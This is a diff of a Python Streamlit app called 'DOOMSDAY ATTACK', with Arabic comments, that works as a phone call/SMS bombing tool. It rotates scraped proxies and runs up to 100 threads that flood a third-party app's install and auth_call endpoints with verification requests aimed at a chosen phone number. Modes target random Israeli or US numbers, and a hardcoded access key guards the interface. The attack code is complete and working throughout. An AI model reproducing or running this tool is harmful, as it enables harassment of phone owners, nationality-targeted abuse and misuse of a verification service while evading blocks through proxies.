@@ -10,7 +10,7 @@ import webbrowser
 import os
 from concurrent.futures import ThreadPoolExecutor
 
-# --- إعدادات الصفحة (نفس الألوان المرعبة) ---
+# --- إعدادات الصفحة ---
 st.set_page_config(page_title="DOOMSDAY ATTACK - GX3GX3", page_icon="💀", layout="wide")
 
 st.markdown("""
@@ -19,9 +19,11 @@ st.markdown("""
     footer {visibility: hidden;}
     header {visibility: hidden;}
     .stDeployButton {display:none;}
-    .main { background-color: #000000; color: #ff0000; }
-    .doom-frame { border: 4px solid #ff0000; padding: 20px; border-radius: 15px; box-shadow: 0 0 30px #ff0000; background-color: #0a0000; text-align: center; }
-    .stats-box { border: 2px solid #ffffff; padding: 15px; border-radius: 10px; background-color: #1a0000; text-align: center; margin: 10px; }
+    .main { background-color: #000000; color: #ff0000; font-family: 'Courier New', Courier, monospace; }
+    .stButton>button { width: 100%; background-color: #660000; color: white; border: 2px solid #ff0000; font-weight: bold; font-size: 20px; height: 60px; }
+    .stButton>button:hover { background-color: #ff0000; color: black; }
+    .doom-frame { border: 4px solid #ff0000; padding: 20px; border-radius: 15px; box-shadow: 0 0 30px #ff0000; margin-bottom: 25px; background-color: #0a0000; text-align: center; }
+    .stats-box { border: 2px solid #ffffff; padding: 15px; border-radius: 10px; background-color: #1a0000; text-align: center; }
     </style>
     """, unsafe_allow_html=True)
 
@@ -32,22 +34,18 @@ if 'authenticated' not in st.session_state:
 if not st.session_state.authenticated:
     st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
     st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
-    st.markdown("<h1 style='color: red;'>🔒 SYSTEM LOCKED</h1>", unsafe_allow_html=True)
+    st.markdown('</div>', unsafe_allow_html=True)
+    st.markdown("<h1 style='text-align: center; color: red;'>🔒 SYSTEM LOCKED</h1>", unsafe_allow_html=True)
     user_key = st.text_input("ENTER ACCESS KEY:", type="password")
-    if st.button("ACTIVATE 🔥"):
+    if st.button("ACTIVATE SYSTEM 🔥"):
         if user_key == "aligx3gx3":
             st.session_state.authenticated = True
             st.rerun()
+        else:
+            st.error("❌ INVALID KEY!")
     st.stop()
 
-# --- واجهة البداية ---
-st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
-st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
-st.markdown("<h1 style='color: #ff0000;'>هجـوم يوم القيامة</h1>", unsafe_allow_html=True)
-st.markdown("</div>", unsafe_allow_html=True)
-
-# --- الكود الأصلي (بدون حذف أي حرف) ---
-
+# --- تثبيت المكتبات تلقائياً (كما هو في كودك) ---
 def install_libs():
     libs = ['requests', 'termcolor', 'pyfiglet']
     for lib in libs:
@@ -61,6 +59,8 @@ install_libs()
 import requests
 from termcolor import colored
 import pyfiglet
+
+# --- الدوال الأصلية بدون حذف أي حرف ---
 
 def generate_unique_ids():
     timestamp = int(time.time() * 1000)
@@ -79,7 +79,8 @@ def fetch_internal_proxies():
             res = requests.get(url, timeout=10)
             if res.status_code == 200:
                 for line in res.text.splitlines():
-                    if ":" in line: proxies.append(line.strip())
+                    if ":" in line:
+                        proxies.append(line.strip())
         except: pass
     return proxies
 
@@ -87,7 +88,8 @@ def is_proxy_working(proxy_dict):
     try:
         response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=3)
         return response.status_code == 200
-    except: return False
+    except:
+        return False
 
 def load_proxies(filename="gx1gx1.txt"):
     all_proxies = []
@@ -102,9 +104,13 @@ def get_working_proxy(proxies_list):
     for _ in range(10):
         if not proxies_list: return None
         raw_proxy = random.choice(proxies_list)
-        proxy_url = f"http://{raw_proxy}" if not raw_proxy.startswith(("http", "socks")) else raw_proxy
+        if not raw_proxy.startswith(("http", "socks")):
+            proxy_url = f"http://{raw_proxy}"
+        else:
+            proxy_url = raw_proxy
         proxy_dict = {"http": proxy_url, "https": proxy_url}
-        if is_proxy_working(proxy_dict): return proxy_dict
+        if is_proxy_working(proxy_dict):
+            return proxy_dict
     return None
 
 def send_install_request(url, headers, payload, proxy=None):
@@ -119,12 +125,18 @@ def send_auth_call_request(url, headers, payload, proxy=None):
         return response.ok and "ok" in response.text
     except: return False
 
-# --- إدارة الحالة والعدادات ---
-if 'stats' not in st.session_state: st.session_state.stats = {"ok": 0, "error": 0}
-if 'running' not in st.session_state: st.session_state.running = False
+# --- إدارة العدادات ---
+if 'stats' not in st.session_state:
+    st.session_state.stats = {"ok": 0, "error": 0}
+if 'running' not in st.session_state:
+    st.session_state.running = False
 
 # --- واجهة التحكم ---
 st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
+st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
+st.markdown("<h1 style='color: #ff0000;'>هجـوم يوم القيامة</h1>", unsafe_allow_html=True)
+st.markdown('</div>', unsafe_allow_html=True)
+
 attack_mode = st.radio("SELECT MODE:", ["Manual Entry", "Random Israel Attack 🇮🇱", "Random USA Attack 🇺🇸"])
 
 if attack_mode == "Manual Entry":
@@ -134,14 +146,12 @@ if attack_mode == "Manual Entry":
 else:
     country_code = "972" if "Israel" in attack_mode else "1"
     number = "RANDOM"
-    st.warning(f"AUTO-ATTACK ENABLED ON {attack_mode}")
+    st.warning(f"ATTACKING {attack_mode}")
 
-threads_count = st.slider("☣️ ATTACK POWER:", 1, 100, 20)
-st.markdown('</div>', unsafe_allow_html=True)
+threads_count = st.slider("☣️ Threads:", 1, 100, 15)
 
-# --- دالة الهجوم (مطابقة لبايثون 100%) ---
 def worker_task(c_code, phone_num):
-    foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "ar", "hi", "he"]
+    foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "ar", "hi"]
     proxies_list = load_proxies("gx1gx1.txt")
     install_url = "https://api.telz.com/app/install"
     auth_call_url = "https://api.telz.com/app/auth_call"
@@ -175,24 +185,21 @@ def worker_task(c_code, phone_num):
         except: st.session_state.stats["error"] += 1
         time.sleep(0.01)
 
-# أزرار التشغيل
-if st.button("🔥 START DOOMSDAY"):
+if st.button("🔥 START ATTACK"):
     if number:
         st.session_state.running = True
         with ThreadPoolExecutor(max_workers=threads_count) as executor:
             for _ in range(threads_count):
                 executor.submit(worker_task, country_code, number)
-    else: st.error("ENTER NUMBER!")
 
 if st.button("🛑 STOP"):
     st.session_state.running = False
     st.rerun()
 
-# --- عدادات النتائج بالإنجليزية ---
+# --- العدادات ---
 st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
-col_ok, col_err = st.columns(2)
-with col_ok:
-    st.markdown(f'''<div class="stats-box"><h2 style="color: #00ff00;">SUCCESS</h2><h1>{st.session_state.stats["ok"]}</h1></div>''', unsafe_allow_html=True)
-with col_err:
-    st.markdown(f'''<div class="stats-box"><h2 style="color: #ff0000;">FAILED</h2><h1>{st.session_state.stats["error"]}</h1></div>''', unsafe_allow_html=True)
+c1, c2 = st.columns(2)
+with c1: st.markdown(f'<div class="stats-box"><h2 style="color: #00ff00;">SUCCESS</h2><h1>{st.session_state.stats["ok"]}</h1></div>', unsafe_allow_html=True)
+with c2: st.markdown(f'<div class="stats-box"><h2 style="color: #ff0000;">FAILED</h2><h1>{st.session_state.stats["error"]}</h1></div>', unsafe_allow_html=True)
 st.markdown('</div>', unsafe_allow_html=True)
+
